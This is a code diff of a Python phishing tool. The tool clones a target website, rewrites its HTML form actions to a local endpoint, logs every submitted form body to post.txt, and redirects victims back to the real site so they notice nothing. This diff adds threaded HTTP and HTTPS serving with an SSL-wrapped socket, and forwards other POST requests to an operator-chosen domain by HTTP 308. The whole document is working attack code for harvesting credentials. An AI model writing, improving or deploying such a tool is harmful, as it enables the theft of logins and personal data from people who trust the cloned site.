@@ -3,8 +3,8 @@ import os
 import http.server
 import socketserver
 import re
-
-# TODO : ADD SSL SUPPORT
+from threading import Thread
+import ssl 
 
 ####################
 ###   CONSTANTS  ###
@@ -24,6 +24,7 @@ INDEX_PATH = os.path.join(WEB_PATH, 'index.html')
 POST_PATH = os.path.join(CURRENT_PATH, 'post.txt')
 DEFAULT_USER_AGENT = "\"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0\""
 PORT = 80
+SSL_PORT = 443
 
 ############################
 ###   INPUT & WEB CRAWL  ###
@@ -31,8 +32,6 @@ PORT = 80
 
 os.system("clear")
 print(BANNER)
-
-redirect_ip = input("[*] What is the IP you want to redirect to : ")
 
 yes = {'yes','y', 'ye'}
 no = {'no', 'n'}
@@ -73,8 +72,13 @@ if not os.path.isfile(INDEX_PATH):
         index_filename = input("[*] Which file in /web should be used as index.html? (filename only) :")
         print("\n [*] Renaming file ...")
         os.rename(os.path.join(WEB_PATH, index_filename), INDEX_PATH)
-        print("[*] Done.\n")
+        print("[*] Download completed.\n")
 
+
+redirect_ip = input("[*] What is the IP/domain <form> actions should forward to : ")
+#ssl_hostname = ### 
+
+#"[*] Which domain(s) should we forward requests we can't answer?"
 
 #########################
 ###  EDIT HTML FORMS  ###
@@ -94,7 +98,7 @@ with open(INDEX_PATH, 'wb') as file:
 
 print("[*] Done.")
 
-input("[*] Press ENTER to start the HTTP server ...")
+input("\n[*] Press ENTER to start the HTTP server ...")
 
 ######################
 ###   HTTP Server  ###
@@ -126,33 +130,45 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         if self.path == "/custom_path_for_form_post_requests":                          # Check if the POST request path is "/custom_path_for_form_post_requests" (where we directed our form actions)
             print("[*] Form was filled! Writing output to post.txt ...")
-            self.send_response(303)                                                     # Send HTTP 303 ("see other") which will make the browser perform a GET on the "Location" header
+            self.send_response(303)                                                     # We use HTTP 303 to force the browser to perform a GET request on our redirect ip/domain.
             self.send_header("Location", url)                                           # Set "Location" header to our initial URL
             with open(POST_PATH, 'a+') as file:                                         # Open post.txt in append mode to add the entire POST request
                 file.write(body.decode("utf-8"))
                 file.write("\n\n")
         else:
-            self.send_response(307)                                                     # Send HTTP 307 redirect response, which will make the browser resend the exact same POST request
-            self.send_header("Location", "http://{}{}".format(redirect_ip,self.path))   # Set the Location value in the HTTP response header to our redirect IP with the path to send the POST request
+            self.send_response(308)                                                     # Send HTTP 308 redirect response, which will make the browser resend the exact same POST request
+            self.send_header("Location", "https://{}{}".format(redirect_ip,self.path))  # Set the Location value in the HTTP response header to our redirect IP with the path to send the POST request
         
         self.end_headers()                                                              # End the HTTP header
 
     def log_message(self, format, *args):
         return
 
-# Change directory to /web and launch the HTTP server there
-os.chdir(WEB_PATH)
-print("\n[*] Launching HTTP server ...")
-httpd = socketserver.TCPServer(("", PORT), SimpleHTTPRequestHandler)
-print("[*] Serving at port {}.".format(PORT))
-print("[*] Use CTRL+C to exit and close the HTTP server.")
+def launch_server(port, http):
+    # Change directory to /web and launch the HTTP/HTTPS server there
+    os.chdir(WEB_PATH)
+    httpd = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)
+    
+    # Whether to launch with HTTP or HTTPS
+    if http:
+        try:
+            print("[*] Serving HTTP at port {}.".format(port))
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            httpd.server_close()
+    else: # HTTPS
+        # Wrap the socket with SSL for HTTPS
+        cert_path = os.path.join(CURRENT_PATH, "localhost.crt")
+        key_path = os.path.join(CURRENT_PATH, "localhost.key")
+        httpd.socket = ssl.SSLContext.wrap_socket(httpd.socket, server_side=True, certfile=cert_path, keyfile=key_path)
+        try:
+            print("[*] Serving HTTPS at port {}.".format(port))
+            print("\n[*] Use CTRL+C to exit and close the HTTP server.")
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            httpd.server_close()
+        
+print("\n[*] Launching HTTP/HTTPS server ...")
+Thread(target=launch_server, args=(PORT, True)).start()
+Thread(target=launch_server, args=(SSL_PORT, False)).start()
 
-# Launch and run HTTP server as long CTRL+C isn't pressed
-try:
-    httpd.serve_forever()
-except KeyboardInterrupt as error:
-    print("\n[*] KeyboardInterrupt ...")
-    httpd.server_close()
-    print("\n[*] Server on port {} was shut down successfully.\n".format(PORT))
-    print("[*] Please run cleanup.py before running this script again!\n")
-    print(error)
